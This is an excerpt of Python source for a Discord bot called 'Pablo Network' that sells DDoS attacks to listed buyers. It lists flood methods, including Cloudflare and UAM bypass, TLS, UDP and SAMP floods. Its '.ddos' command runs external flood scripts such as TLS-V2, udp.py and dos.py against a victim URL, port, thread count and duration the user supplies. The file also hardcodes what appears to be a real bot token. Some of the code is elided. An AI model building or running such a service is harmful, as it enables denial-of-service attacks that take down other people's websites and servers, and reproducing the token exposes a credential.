...
buyers  = [888743040351617074]  #          
admins  = [888743040351617074]  #   ID users            
owners  = [888743040351617074]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW','TLS','SAMP','SAMP2'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTE3NDUyNDg1NDA2MjU2MzM3OA.GVDgkd.XJccpbDR-CttwbazTos9zJ8YIdWzi2fRsuKTk0' # paste your token here
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="Pablo Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**All Methods**", value = f"```yaml\nHTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUAM-BYPASS\nSLOW\nTLS\nSAMP\nSAMP2```")
        embed.add_field(name = "**Syntax**", value = "```md\n.ddos <method> <url> <port> <thread> <time>```")
        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Pablo Network.")
        embed.set_footer(text = f"©{year_now} Copyright Pablo.")
...
@bot.command()
async def ddos(ctx, method : str = None, victim : str = None, port : str = None, thread : str = None, time : str = None):
    if ctx.author.id not in buyers: 
        ...
        if method is None:
            ...
            embed = discord.Embed(title="Error!", description=f"You need a port! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif thread is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"Pablo Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    ...
                    embed.set_footer(text = f"©{year_now} Copyright Pablo.")
                    await ctx.send(embed=embed)
                    system(f'node TLS-V2 {victim} {time2} 8 {thread2}')
                elif method == 'SAMP':
                    embed = discord.Embed(title=f"Pablo Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    ...
                    embed.set_footer(text = f"©{year_now} Copyright Pablo.")
                    await ctx.send(embed=embed)
                    system(f'python3 udp.py -i {victim} -p {port} -t {time2} -th {thread2}')
                elif method == 'SAMP2':
                    embed = discord.Embed(title=f"Pablo Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    ...
                    embed.set_footer(text = f"©{year_now} Copyright Pablo.")
                    await ctx.send(embed=embed)
                    system(f'python dos.py -i {victim} -p {port} -t {time2} -th {thread2}')
